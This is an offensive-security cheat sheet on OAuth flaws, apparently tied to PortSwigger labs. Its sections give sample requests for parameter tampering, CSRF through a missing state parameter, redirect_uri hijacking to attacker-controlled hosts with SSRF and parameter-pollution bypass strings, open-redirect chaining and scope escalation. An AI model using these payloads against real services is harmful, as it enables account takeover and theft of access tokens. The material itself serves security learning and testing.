# OAuth Authentication Vulnerabilities

## **Table of Contents**
1. [Improper Implementation of the Implicit Grant Type](#improper-implementation-of-the-implicit-grant-type)
2. [Exploiting Absense of State Parameter](#Exploiting-Absense-of-State-Parameter)
3. [OAuth Account Hijacking With SSRF and Parameter via `redirect_uri`](#oauth-account-hijacking-with-ssrf-and-parameter-pollution-via-redirect_uri)
4. [Stealing OAuth Access Tokens via an Open Redirect](#stealing-oauth-access-tokens-via-an-open-redirect)
5. [Stealing OAuth Access Tokens via a Proxy Page](#stealing-oauth-access-tokens-via-a-proxy-page)
6. [Exploiting `response_mode`](#exploiting-response_mode)
7. [Exploiting flawed scope validation in authorization code grant type in Oauth service provider server](#Exploiting-flawed-scope-validation-in-authorization-code-grant-type-in-Oauth-service-provider-server)
8. [Unverified User Registration](#unverified-user-registration)
9. [Unprotected Dynamic Client Registration via OpenID Connect](#unprotected-dynamic-client-registration-via-openid-connect)
10. [Allowing authorization requests by reference](#Allowing-authorization-requests-by-reference)

---
**Note:**

  1. In `Implicit grant type` browser always recieves a `token`.<br>
  2. In `authorization code grant type` browser recieves a `code`.<br>
  3. Always check `response_type` header to identify the grant type.
---

### Authorization code grant type

**Authorization request :**
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
**Authorization code grant :**
```
GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```
**Access token request :**
<br><br>All communication from this point on takes place in a secure back-channel and, therefore, cannot usually be observed.
```
POST /token HTTP/1.1
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
```

### Implicit grant type

**Authorization request :**
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
**Access token grant :**
```
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```
---

### Improper implementation of the implicit grant type
In the implicit flow, this POST request is exposed to attackers via their browser. As a result, this behavior can lead to a serious vulnerability if the client application doesn't properly check that the access token matches the other data in the request. In this case, an attacker can simply `change the parameters` sent to the server to impersonate any user. **For example:** When a token is sent to attacker browser, an attacker might change the `username`,`email` or other details targeting another user.<br>

**Initial Request:**
```http
{"email":"victim@victim.com","username":"victim","token":"z7O3nwAGgRrarVPHp3vULtgTqPkP0jlZPTtNRZ9T-Ho"}
```
**Tempered Request:**
```http
{"email":"attacker@attacker.com","username":"attacker","token":"z7O3nwAGgRrarVPHp3vULtgTqPkP0jlZPTtNRZ9T-Ho"}
```
---

### Exploiting Absense of State Parameter

In Oauth mechanism, `state` parameter in authorization request work as a CSRF token. Absense of this parameter can be exploitable to CSRF attack. Applications use oauth mechanism for connecting other applications `(gmail, facebook, applie id)` to the client account. In this case, we can use this flaw to connect our own application `(gmail, facebook, applie id)` to the victim account by crafting an url. <br>

**Here is an example of authorization request without `state` parameter**
<br>
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile HTTP/1.1
Host: oauth-authorization-server.com
```
**Now we can send the request with `code` to a victim.**
```
GET /oauth-login?code=epAPZZJJLQCCYm6sI7NSKgiq37kkBndfvXxsw1wfukJ
Host: client-app.net
```

---

### OAuth Account Hijacking With SSRF and Parameter Pollution via `redirect_uri`

Depending on the grant type, the `redirect_uri` parameter is used to send the authorization code to the specified domain in the `redirect_uri`. If an OAuth mechanism allows arbitrary domains to be specified in the `redirect_uri`, an attacker could exploit this flow to hijack the authorization code.

For example:  
```
redirect_uri=https://client-app.net
```
The code is sent to `client-app.net`.  
```
redirect_uri=https://attacker.com
Or,
redirect_uri=https://attacker.com/.client-app.net
```
The code is sent to `attacker.com`.<br>
<br>
**Note: If this process not work, try with `ssrf defense bypass` technique and `parameter pollution`.** <br>
<br>
**SSRF** : `redirect_uri=https://default-host.com&@foo.evil-user.net#@bar.evil-user.net/`<br>
**Parameter Pollution** : `client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`
<br>
<br>Check this for more details >> [Flawed redirect_uri validation](https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens)

---

### Stealing OAuth access tokens via an open redirect

If `redirect_uri` is not accepting arbitrary domain, we may be able to use directory traversal tricks to supply any arbitrary path on the domain. Something like this:
```
redirect_uri=https://client-app.com/oauth/callback/../
```
Or,
```
redirect_uri=https://client-app.com/oauth/callback/../../example/path
```
This will be interpreted on the back-end as:
```
https://client-app.com/example/path
```
At this point, if we find any `open redirect` vulnerability on `/example/path`, we can chain this issue to sent request to an attacker-controlled domain where we can host any malicious script and steal the `code`.

Check this for more details : [Portswigger Lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

---

### Stealing OAuth access tokens via a proxy page

More deatils: [Portswigger Lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)

---

### Exploiting response_mode

In some cases, changing `response_mode` can let you to bypass `redirect_uri` validation. You can change the value with `query`, `fragment`, `web_message`. Also if you notice that the `web_message` response mode is already in the request, this often allows a wider range of subdomains in the `redirect_uri`.
<br>
```
https://auth.example.com/authorize?
client_id=12345
&redirect_uri=https://client-app.net
&response_type=code
&response_mode=web_message
```

---

### Exploiting flawed scope validation in authorization code grant type in Oauth service provider server

**Note: For this we need our own malicious application**

In some scenario we can leak user information from `Oauth authorization server` by exploiting a misconfigured `scope` parameter during server-to-server token exchange.<br>
<br>
**Initial Authorization Request**
```
GET /authorize?client_id=12345
&redirect_uri=https://attacker.com/callback
&response_type=code
&scope=openid email
&state=xyz123
HTTP/1.1
Host: oauth-authorization-server.com
```
Now, the attacker exchanges the authorization code for an access token but modifies the `scope` parameter to include `profile`.<br>
<br>
**Authorization Code Exchange**
```
POST /token HTTP/1.1
Host: oauth-authorization-server.com
Content-Type: application/x-www-form-urlencoded

client_id=12345
&client_secret=SECRET
&redirect_uri=https://attacker.com/callback
&grant_type=authorization_code
&code=abc123xyz
&scope=openid email profile
```
In vulnerable case, the server does not reject the request and issues an access token with elevated privileges. Now the attacker has an access token with unauthorized profile access and can retrieve sensitive user data via API calls.<br>
<br>
**API call**
```
GET /userinfo HTTP/1.1
Host: api.oauth-authorization-server.com
Authorization: Bearer z0y9x8w7v6u5
```
***Note: `z0y9x8w7v6u5` is the access token.*** <br>
<br>We can do this in implicit grant type also by stealing the access token.<br>
<br>
More details: [Portswigger](https://portswigger.net/web-security/oauth#flawed-scope-validation)

---

### Unverified user registration

Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases `(In this case email verification with OTP don't work)`. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider.

---

### Unprotected dynamic client registration via OpenID Connect

For more details: [Portswigger](https://portswigger.net/web-security/oauth/openid#unprotected-dynamic-client-registration)

---

### Allowing authorization requests by reference

For more deatils: [Portswigger](https://portswigger.net/web-security/oauth/openid#allowing-authorization-requests-by-reference)

---
